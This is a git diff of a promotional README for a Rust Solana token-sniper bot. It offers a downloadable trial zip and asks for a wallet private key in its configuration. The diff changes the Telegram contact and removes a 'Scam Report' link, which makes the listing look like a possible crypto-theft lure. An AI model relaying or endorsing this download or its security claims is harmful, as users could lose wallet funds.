@@ -1,76 +1,78 @@
-# Solana Ultra-Fast New Token Sniper on Raydium and Pump.fun in Rust 🚀
+# Solana Ultra-Fast Token Sniper on Raydium & Pump.fun (Rust) 
 
 ## Overview
 
-Introducing the **Solana Ultra-Fast New Token Sniper** written in **Rust** 🦀, designed to detect newly launched tokens on both **Raydium** and **Pump.fun** and execute buys at lightning speed ⚡. With Rust's memory safety features and performance optimizations, built with Rust for superior performance and security. Tailored for both novice and experienced traders.
-
----
+Introducing the **Solana Ultra-Fast Token Sniper**, a high-performance **Rust-based** bot engineered to snipe newly launched tokens on **Raydium** and **Pump.fun** at unparalleled speeds. Designed for precision and efficiency, this sniper bot leverages **low-latency execution, gRPC data feeds, and MEV optimization** to give traders an edge in volatile markets.
 
 ## Key Features
 
-### 🚀 Speed and Efficiency
-- **Lightning-Quick Transactions**: Leveraging Rust's exceptional performance, our bot allows you to snipe new tokens almost instantly. Say goodbye to delays and seize opportunities as they arise!
+### 🚀 Speed & Efficiency
+- **Real-Time Token Detection**: Instantly detects new token listings on Raydium and Pump.fun.
+- **Ultra-Low-Latency Execution**: Uses **Jito bundles and gRPC streaming** for near-instant transactions.
+- **Optimized Rust Performance**: Memory-safe, concurrency-efficient architecture for **lightning-fast trades**.
 
-### 🔒 Safety First
-- **Robust Security**: Rust's safety guarantees minimize bugs and vulnerabilities, ensuring your trading activities are secure. Trade with confidence and peace of mind.
+### 🔒 Security & Reliability
+- **Private Key Protection**: Does not expose private keys in logs or memory.
+- **Block Malicious Wallets**: Supports a blacklist feature to avoid frontrunning wallets.
+- **Custom Slippage & Risk Controls**: Configurable slippage, auto-sell, and stop-loss functions.
 
-### 📊 Multiple gRPC Connections
-- **Stay Updated**: Effortlessly connect to top Solana data providers like **Helius** and **Yellowstone** through multiple gRPC connections. Get real-time updates and make informed trading decisions.
+### 📊 Advanced Trading Strategies
+- **Dynamic Buy & Sell Triggers**: Automates purchases & sales based on market trends.
+- **Volume-Based Execution**: Responds to large transactions to follow whale movements.
+- **Auto-Sell Protection**: Ensures exit from positions within a defined time frame.
 
-### 👩‍💻 User-Friendly Interface
-- **Intuitive Design**: Our sniper bot features a clean and accessible interface, making it easy for users of all experience levels to navigate. Start trading in no time!
-
-### 🛠️ Rich Utilities
-- **Advanced Features**:
-  - **jito-confirm**: Engage in low-latency transactions on platforms like Raydium and Pumpfun.
-  - **jito-bundle**: Bundle buy/sell actions with up to **20 wallets** in Raydium/Pumpfun, enhancing your trading strategy and flexibility.
+### 🛠️ Deep Integration with Solana Ecosystem
+- **Helius & Yellowstone gRPC Support**: Connects to **multiple data feeds** for real-time insights.
+- **Jito Block Engine**: Enhances transaction confirmation speed using **bundled transactions**.
+- **DEX Compatibility**: Works seamlessly with **Raydium, Pump.fun, Meteora, and Orca**.
 
 ---
 
-## Directory Structure
+## 📁 Directory Structure
 
-```
+```plaintext
 src/
 ├── core/
 │   ├── token.rs        # Token definitions and handling
-│   └── tx.rs        # Transaction handling
-| 
+│   ├── tx.rs           # Transaction processing & execution
+│
 ├── engine/
-│   ├── swap.rs        # Token swap(buy/sell) functionalities in various Dexs
-│   └── monitor        # New token monitoring(and parse tx) in Dexs using geyser rpc, and normal rpc
-│       └── helius.rs        # Helius gRpc for tx listen and parse.
-│       └── yellowstone.rs        # Yellowstone gRpc for tx listen and parse.
-|
+│   ├── swap.rs         # Buy/Sell functionalities across DEXs
+│   ├── monitor/        # Token monitoring & RPC parsing
+│   │   ├── helius.rs       # Helius gRPC for transaction listening
+│   │   ├── yellowstone.rs  # Yellowstone gRPC for real-time updates
+│
 ├── dex/
-│   ├── pump_fun.rs        # Pump.fun
-│   ├── raydium.rs        # Raydium
-│   ├── meteora.rs        # Meteora
-│   └── orca.rs        # Orca
+│   ├── pump_fun.rs     # Pump.fun integration
+│   ├── raydium.rs      # Raydium integration
+│   ├── meteora.rs      # Meteora integration
+│   ├── orca.rs         # Orca integration
 │
 ├── services/
-│   ├── jito.rs        # Jito service provides ultra-fast transaction confirmation
-│   └── nextblock.rs        # NextBlock service provides the ultra-fast transaction confirmation in unique way
-|
+│   ├── jito.rs         # Jito for fast transaction inclusion
+│   ├── nextblock.rs    # Alternative fast transaction confirmation service
+│
 ├── common/
-│   ├── logger.rs        # Logs to be clean and convenient to monitor.
-│   └── utils.rs        # Utility functions used across the project
+│   ├── logger.rs       # Structured logging for debugging
+│   ├── utils.rs        # Utility functions used across the project
 │
 ├── lib.rs
 └── main.rs
+
 ```
 ---
 ## Trial Version
 🗂️ [solana-raypump-sniper(trial).zip](https://github.com/user-attachments/files/18754518/solana-raypump-sniper.trial.zip)
 
-### Trading Strategy
+### 🎯 Trading Strategy
 
-- Monitor for user purchases of $1,000 tokens; execute a buy order at that point.
-- Monitor for user sales of $300 tokens; execute a sell order at that point.
-- If a position remains open for more than 60 seconds, initiate an automatic sell.
-(Note: Both the $1,000 and $300 thresholds, as well as the 60-second time frame, are adjustable parameters.)
+- **Buy Entry:** Executes a purchase when a $1,000+ token buy is detected.
+- **Sell Exit:** Triggers a sell when a $300+ token sale is detected.
+- **Time-Limit Protection:** If a trade remains open for more than 60 seconds, an auto-sell is initiated.
+- **Customizable Parameters:** Modify buy/sell thresholds & time-frame to fit personal strategy.
 
-### How To Run
-1. Environment Variables Settings
+### 🛠️ How to Run
+1. Configure Environment Variables
 ```plaintext
 PRIVATE_KEY=your_private_key_here
 RPC_HTTPS=https://mainnet.helius-rpc.com/?api-key=your_api_key_here
@@ -98,15 +100,12 @@ TIME_EXCEED=60
 ![image](https://github.com/user-attachments/assets/dffc8e4b-cd00-4921-8488-e25230f4a31a)
 
 ---
-## Donate
+## 💰 Donations
 
 👉👌 6vT7nrqtbXDWVc8cRUtifxgfDZi19aW7qhcZg2hSepwb
 
 ---
-## Support
+## 📞 Support & Contact
 
-For support and further inquiries, please connect via Telegram: 📞 [jwest951227](https://t.me/jwest951227).
+For support and further inquiries, please connect via Telegram: 📞 [DillonSolai](https://t.me/DillonSolai).
 
-## Scam Report
-
-https://github.com/Solana-Sniper-Bot-Download/Solana-Raydium-Pumpfun-Sniper-Bot/issues/2
